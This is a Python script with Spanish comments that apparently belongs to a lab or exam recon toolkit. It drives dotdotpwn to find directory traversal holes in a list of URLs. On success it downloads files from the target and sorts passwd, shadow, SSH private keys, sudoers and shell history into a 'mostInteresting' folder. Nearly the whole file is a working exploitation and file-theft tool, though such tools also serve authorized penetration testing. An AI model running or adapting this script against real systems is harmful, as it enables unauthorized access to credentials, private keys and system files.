#!/usr/bin/python

# SOLO WEB IMPLEMENTADO
# Si existe /usr/share/dotdotpwn/Reports, dotdotpwn colocará automáticamente los resultados ahí
# reconscan.py crea el directorio Reports automáticamente

import sys
import os
import subprocess
from subprocess import CalledProcessError
import argparse
import multiprocessing
from multiprocessing import Process, Queue
import requests
import time
from shutil import move

# Ejecuta escaneos regulares y con extensiones usando dotdotpwn sobre una lista de URLs
# Si detecta vulnerabilidad, exporta el resultado al directorio /dirb/
def dotPwn(URL):
# Opciones de dotdotpwn.pl:
# -m    Módulo [http | http-url | ftp | tftp | payload | stdout]
# -h    Hostname
# -O    Detección de Sistema Operativo con nmap
# -o    Tipo de SO ("windows", "unix" o "generic")
# -s    Detección de versión de servicio
# -d    Profundidad de recorridos (por defecto 6)
# -f    Nombre de archivo específico a comprobar (ej. /etc/passwd)
# -u    URL con la parte a fuzzear marcada como TRAVERSAL
# -k    Patrón de texto para confirmar vulnerabilidad (ej. "root:")
# -x    Puerto de conexión
# -t    Tiempo en milisegundos entre peticiones
# -e    Extensión añadida al final de cada cadena
# -b    Detenerse tras el primer hallazgo
# -q    Modo silencioso
# -C    Continuar si no se reciben datos
    port, resultsOut, baseURL, URL, module = parseURL(URL)
    konfirmString,konfirmFile = setDotPwnOptions()
    if ("TRAVERSAL" in URL):
        DOTPWN = 'dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b' % (module, URL, baseURL, konfirmString, konfirmFile, args.depth, args.os, port)
        print("DOTPWN: %s" % DOTPWN)
        DOTPWNE = 'dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (module, URL, baseURL, konfirmString, konfirmFile, args.depth, args.os, port, args.extensions)
    else:
        print("ADVERTENCIA: NO SE ENCONTRÓ LA CADENA 'TRAVERSAL' EN LA URL")
        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b' % (baseURL, konfirmString, konfirmFile, args.depth, args.os, port)
        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (baseURL, konfirmString, konfirmFile, args.depth, args.os, port, args.extensions)
    try:
        DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)
    except CalledProcessError as ex:
        writeOutputFile = True
        text = ex.output.split("\n")
        for line in text:
            if ("[+] Total Traversals found: 0" == line):
                print("INFO: No se encontraron traversals para %s" % URL)
                writeOutputFile = False
            if ("<- VULNERABLE" in line):
                vuln.append(line)
        if (writeOutputFile):
            try:
                outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s" % resultsOut
                print("INFO: ¡Traversals encontrados! Ver %s" % outfile)
                outFileWriter = open(outfile, "w")
                outFileWriter.write(ex.output)
                outFileWriter.close()
            except:
                raise
    if (len(vuln) == 0): # no ejecutar escaneo de extensiones si ya detectamos vulnerabilidad
        try:
            DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)
        except CalledProcessError as fx:
            writeOutputFile = True
            textE = fx.output.split("\n")
            for line in textE:
                if ("[+] Total Traversals found: 0" == line):
                    print("INFO: No se encontraron traversals para %s usando extensiones de archivo" % URL)
                    writeOutputFile = False
                if ("<- VULNERABLE" in line):
                    vuln.append(line)
            if (writeOutputFile):
                try:
                    outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/E%s" % resultsOut
                    print("INFO: ¡Traversals encontrados usando extensiones! Ver %s" % outfile)
                    outFileWriter = open(outfile, "w")
                    outFileWriter.write(fx.output)
                    outFileWriter.close()
                except:
                    raise
    if (args.scan_and_retrieve and len(vuln) > 0):
        print("INFO: Descargando archivos")
        retrieve()

# Descarga archivos objetivo una vez confirmada la vulnerabilidad
def retrieve():
    vulnURLs = analyzeVuln(vuln)
    tmp = vulnURLs[0]
    vulnProto = tmp[0]
    vulnBase = tmp[1]
    vulnPage = tmp[2]
    vulnStringPrefix = tmp[3]
    vulnStringSuffix = tmp[4]
    encodedSplit = tmp[5]
    try:
        xfilFileName = "%s" % args.xfil_files
        xfilFile = open(xfilFileName,'r')
        for xfil in xfilFile:
            if (xfil[0] == "/"):
                xfil = xfil[1:]
            if ("\n" in xfil):
                xfil = xfil[:-1]
            xfiltmp = xfil.replace("/", "_") # para archivo de salida
            vulnBasetmp = vulnBase.replace("/", "_") # para archivo de salida
            xfil = xfil.replace("/", encodedSplit)
            if vulnPage == "":
                fullURL = vulnProto + vulnBase + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
            else:
                fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
            fileContents, status_code = grabFileFromURL(fullURL)
            if (status_code == 200):
                outputFile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s_%s" % (vulnBasetmp, xfiltmp)
                try:
                    output = open(outputFile, 'w+')
                    output.write(fileContents)
                    output.close()
                except UnicodeEncodeError:
                    output = open(outputFile, 'w+')
                    fileContents = fileContents.encode('ascii','xmlcharrefreplace')
                    output.write(fileContents)
                    output.close()
                except:
                    raise
    except:
        raise
    sortRetrievedFiles()
    time.sleep(1)
    sortMostInterestingFiles()
    time.sleep(1)
    sortEverythingElse()
    print("INFO: Descarga de archivos completada")

def grabFileFromURL(url):
    try:
        r = requests.get(url)
        if (r.status_code == 200):
            return r.text, r.status_code
        else:
            return False, r.status_code
    except:
        raise


def sortRetrievedFiles():
    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
    os.chdir(downloadDir)
    files = os.listdir(downloadDir)
    sizes = []
    moveTheseFiles = []
    for item in files:
        if os.path.isfile(item):
            sizes.append(os.path.getsize(item))
    for size in sizes:
        if sizes.count(size) > 3:
            moveTheseFiles.append(size)
    for sizeOfitems in moveTheseFiles:
        try:
            os.makedirs(str(sizeOfitems))
        except:
            pass
        for items in files:
            if os.path.getsize(items) == sizeOfitems:
                newpath = "./%s/%s" % (str(sizeOfitems),items)
                os.rename(items,newpath)
                files.remove(items)

def sortMostInterestingFiles():
    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
    os.chdir(downloadDir)
    files = os.listdir(downloadDir)
    mostInterestingFiles = "passwd","shadow","id_rsa","id_dsa","passdb","samba","ssh","authorized","sudoers","history"
    try:
        os.makedirs("mostInteresting")
    except:
        pass
    for item in files:
        for name in mostInterestingFiles:
            if (name in item):
                new = "./mostInteresting/%s" % (item)
                move(item,new)
                break

def sortEverythingElse():
    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
    os.chdir(downloadDir)
    files = os.listdir(downloadDir)
    everythingElse = "etc","var","proc"
    try:
        for folder in everythingElse:
            os.makedirs(folder)
    except:
        pass
    for item in files:
        for name in everythingElse:
            if (os.path.isdir(item)):
                break
            if (name in item):
                new = "./%s/%s" % (name,item)
                move(item,new)
                break

# 1, obtener puerto
# 2, archivo de salida no puede contener "/" en el nombre
# 3, obtener base url
# 4, limpiar saltos de línea \n
def parseURL(url):
    tmp = url.split(":")
    if (len(tmp) == 3):
        tmp2 = tmp[2]
        port = tmp2.split("/")[0]
    if (len(tmp) <= 2):
        if ("https" == tmp[0]):
            port = "443"
        elif ("http" == tmp[0]):
            port = "80"
    if (len(tmp) > 3):
        port = "80"
    try:
        resultsOut = url.split("/")[2] + url.split("/")[3]
    except:
        raise
    tmp4 = url.split(":")[1]
    baseURL = tmp4[2:]
    if ("\n" in url):
        URL = url[:-1]
    else:
        URL = url
    if ("http" in URL):
        module = "http-url"
    elif ("ftp" in URL):
        module = "ftp"
    return port, resultsOut, baseURL, URL, module

def setDotPwnOptions():
    if (args.os == "unix"):
        konfirmString = '"root:"'
        konfirmFile = '/etc/passwd'
    if (args.os == "windows"):
        konfirmString = '"[fonts]"'
        konfirmFile = '/windows/win.ini'
    return konfirmString,konfirmFile

def analyzeVuln(vulnar):
    final = []
    for vuln in vulnar:
        vulnProto = ""
        vulnURL = []
        vulnBase = ""
        vulnPage = ""
        vulnStringPrefix = ""
        vulnStringSuffix = ""
        encodedSplit = ""
        tmp = vuln[17:len(vuln)-14]
        vulnURL.append(tmp)
        if ("http://" in tmp):
            vulnProto = "http://"
            vulnBase = tmp.split("http://")[1]
        if ("https://" in tmp):
            vulnProto = "https://"
            vulnBase = tmp.split("https://")[1]
        if ("ftp://" in tmp):
            vulnProto = "ftp://"
            vulnBase = tmp.split("ftp://")[1]
        vulnPagetmp = vulnBase.split("/",1)[1]
        vulnBase = vulnBase.split("/",1)[0]
        vulnBase = vulnBase + "/"
        if ("=" in vulnPagetmp):
            vulnPage = vulnPagetmp.split("=",1)[0]
            vulnPage = vulnPage + "="
            vulnStringPrefixtmp = vulnPagetmp.split("=",1)[1]
        else:
            if ("passwd" in vulnPagetmp or "win.ini" in vulnPagetmp):
                vulnPage = ""
            else:
                vulnPage = vulnPagetmp.split("/",2)[0]
                vulnPage = vulnPage + "/"
            vulnStringPrefixtmp = vulnPagetmp.split("/",2)[len(vulnPagetmp.split("/",2))-1]
        if (args.os == 'unix'):
            vulnStringPrefix = vulnStringPrefixtmp.split("etc")[0]
            encodedSplittmp = vulnStringPrefixtmp.split("etc")[1]
            if ("passwd" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("passwd")[1]
                for c in encodedSplittmp:
                    if (c == "p"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
            if ("issue" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("issue")[1]
                for c in encodedSplittmp:
                    if (c == "p"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
        if (args.os == 'windows'):
            print("VulnStringPrefixtmp: " + vulnStringPrefixtmp)
            vulnStringPrefix = vulnStringPrefixtmp.split("windows")[0]
            encodedSplittmp = vulnStringPrefixtmp.split("windows")[1]
            if ("win.ini" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("win.ini")[1]
                for c in encodedSplittmp:
                    if (c == "w"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
        vals = vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
        print("DEBUG: Asegúrate de que estos valores sean correctos: vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit")
        print(vals)
        final.append(vals)
    return final

if __name__=='__main__':

    parser = argparse.ArgumentParser(description='Script para gestionar descubrimiento y exfiltración de archivos mediante Directory Traversal. Uso recomendado: dirTrav <URLs> <os> -sr')
    parser.add_argument('-d', '--scan-depth', type=int, action="store", dest="depth", default=10, help="Profundidad de ../../../ por defecto 10")
    parser.add_argument('-e', '--extensions', type=str, action="store", dest="extensions", default='".html"', help='Extensiones añadidas al final de cada cadena de prueba')
    parser.add_argument('file', type=str, help="Archivo con lista de URLs a probar")
    parser.add_argument('os', type=str, action="store", help="SO objetivo para reducir falsos positivos y acelerar el escaneo: 'windows' o 'unix'")
    parser.add_argument('-s', '--scan', action="store_true", dest="scan", default="true", help="Escanear el objetivo en busca de directory traversal")
    parser.add_argument('-sr', '--scan-and-retrieve', nargs='?', const='true', default='false', dest="scan_and_retrieve", help="Escanear y descargar archivos si se detecta directory traversal")
    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/DirTrav/linux_all.txt", help="Lista de archivos a descargar si se detecta la vulnerabilidad")

    args = parser.parse_args()
    vuln = []
    inputFileName = "%s" % args.file
    if (args.os == "windows"):
        if ("linux_all.txt" in args.xfil_files):
            print("Error: No se deben descargar archivos de Linux en Windows. Cambia os a Linux o pasa un archivo con rutas Windows a -x")
            raise
        if (args.os == "linux"):
            if ("windows_all.txt" in args.xfil_files):
                print("Error: No se deben descargar archivos de Windows en Linux. Cambia os a Windows o pasa un archivo con rutas Linux a -x")
                raise
            
    if (args.scan):
        try:
            inputFile = open(inputFileName,'r')
            jobs = []
            print("INFO: Iniciando Dotdotpwn")
            for URL in inputFile:
                if ("\n" in URL):
                    URL = URL[:-1]
                if (URL[0] != "#"):
                    p = multiprocessing.Process(target=dotPwn, args=(URL,))
                    jobs.append(p)
                    p.start()
            inputFile.close()
        except:
            raise
